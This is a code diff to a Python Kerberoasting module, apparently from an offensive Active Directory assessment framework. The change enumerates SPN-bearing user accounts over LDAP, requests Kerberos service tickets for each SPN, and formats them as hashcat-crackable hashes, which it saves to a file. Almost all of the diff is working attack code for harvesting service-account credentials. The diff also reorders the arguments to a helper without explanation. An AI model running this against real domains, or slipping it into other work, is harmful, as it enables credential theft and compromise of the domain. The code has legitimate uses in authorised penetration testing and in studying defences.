@@ -1,10 +1,17 @@
-"""Kerberoasting capability (Impacket-backed, hashcat format)."""
+"""Kerberoasting capability (Impacket-backed, hashcat format).
+
+- Shared auth via get_kerberos_tgt (password / hash / AES / ccache)
+- Shared LDAP via ldap_connect
+- Multi-SPN per account
+- AES + RC4 etype preference in TGS requests
+"""
 
 from __future__ import annotations
 
 import json
 from typing import Any
 
+from ldap3 import SUBTREE
 from rich.console import Console
 
 from adaf_attack.core.auth import describe_auth, get_kerberos_tgt
@@ -58,11 +65,11 @@ class Kerberoast:
         conn.search(
             base_dn,
             "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))",
-            search_scope=__import__("ldap3").SUBTREE,
+            search_scope=SUBTREE,
             attributes=["sAMAccountName", "servicePrincipalName", "userAccountControl"],
         )
 
-        targets = []
+        targets: list[dict[str, Any]] = []
         for entry in conn.entries:
             sam = str(entry.sAMAccountName)
             spns = [str(s) for s in (entry.servicePrincipalName or [])]
@@ -74,7 +81,11 @@ class Kerberoast:
                     graph.add_edge(user_id, user_id, "HasSPN", spn=spn)
 
         conn.unbind()
-        console.print(f"Found [cyan]{len(targets)}[/cyan] SPN-enabled accounts")
+        total_spns = sum(len(t["spns"]) for t in targets)
+        console.print(
+            f"Found [cyan]{len(targets)}[/cyan] SPN-enabled accounts "
+            f"([cyan]{total_spns}[/cyan] SPNs)"
+        )
 
         tgt, cipher, _old, session_key = get_kerberos_tgt(target)
 
@@ -83,38 +94,43 @@ class Kerberoast:
 
         for t in targets:
             sam = t["sam"]
-            spn = t["spns"][0]
-            try:
-                spn_principal = Principal(
-                    spn, type=constants.PrincipalNameType.NT_SRV_INST.value
-                )
-                tgs, cipher, _old, session_key = getKerberosTGS(
-                    spn_principal,
-                    target.domain.upper(),
-                    target.dc_ip,
-                    tgt,
-                    cipher,
-                    session_key,
-                )
+            for spn in t["spns"]:
+                try:
+                    spn_principal = Principal(
+                        spn, type=constants.PrincipalNameType.NT_SRV_INST.value
+                    )
+                    tgs, cipher, _old, session_key = getKerberosTGS(
+                        spn_principal,
+                        target.domain.upper(),
+                        target.dc_ip,
+                        tgt,
+                        cipher,
+                        session_key,
+                    )
 
-                hashcat_line = format_tgs_hashcat(tgs, sam, target.domain, spn)
-                entry: dict[str, Any] = {
-                    "account": sam,
-                    "spn": spn,
-                    "format": "hashcat-13100" if hashcat_line else "impacket-raw",
-                }
-                if hashcat_line:
-                    entry["hash"] = hashcat_line
-                    hash_lines.append(hashcat_line)
-                else:
-                    entry["ticket"] = str(tgs)
-                    entry["note"] = "Could not build hashcat line; raw ticket kept"
+                    hashcat_line = format_tgs_hashcat(spn, sam, target.domain, tgs)
+                    entry: dict[str, Any] = {
+                        "account": sam,
+                        "spn": spn,
+                        "format": "hashcat-13100" if hashcat_line else "impacket-raw",
+                    }
+                    if hashcat_line:
+                        entry["hash"] = hashcat_line
+                        hash_lines.append(hashcat_line)
+                        # Detect etype from hashcat prefix when present
+                        if "$krb5tgs$18$" in hashcat_line or "$krb5tgs$17$" in hashcat_line:
+                            entry["format"] = "hashcat-aes"
+                        elif "$krb5tgs$23$" in hashcat_line:
+                            entry["format"] = "hashcat-13100"
+                    else:
+                        entry["ticket"] = str(tgs)
+                        entry["note"] = "Could not build hashcat line; raw ticket kept"
 
-                roasted.append(entry)
-                console.print(f"  [green]✓[/green] {sam}  ({spn})")
-            except Exception as exc:  # noqa: BLE001
-                console.print(f"  [red]✗[/red] {sam}  ({exc})")
-                roasted.append({"account": sam, "spn": spn, "error": str(exc)})
+                    roasted.append(entry)
+                    console.print(f"  [green]✓[/green] {sam}  ({spn})")
+                except Exception as exc:  # noqa: BLE001
+                    console.print(f"  [red]✗[/red] {sam}/{spn}  ({exc})")
+                    roasted.append({"account": sam, "spn": spn, "error": str(exc)})
 
         result = {
             "domain": target.domain,
@@ -124,11 +140,11 @@ class Kerberoast:
 
         redacted = redact(result, include_secrets=include_secrets)
         out_path = session.path("kerberoast.json")
-        out_path.write_text(json.dumps(redacted, indent=2, default=str))
+        out_path.write_text(json.dumps(redacted, indent=2, default=str), encoding="utf-8")
 
         if include_secrets and hash_lines:
             hashes_path = session.path("kerberoast.hashes.txt")
-            hashes_path.write_text("\n".join(hash_lines) + "\n")
+            hashes_path.write_text("\n".join(hash_lines) + "\n", encoding="utf-8")
             console.print(f"Hashcat file → {hashes_path}")
 
         graph.save(session.path("graph.json"))
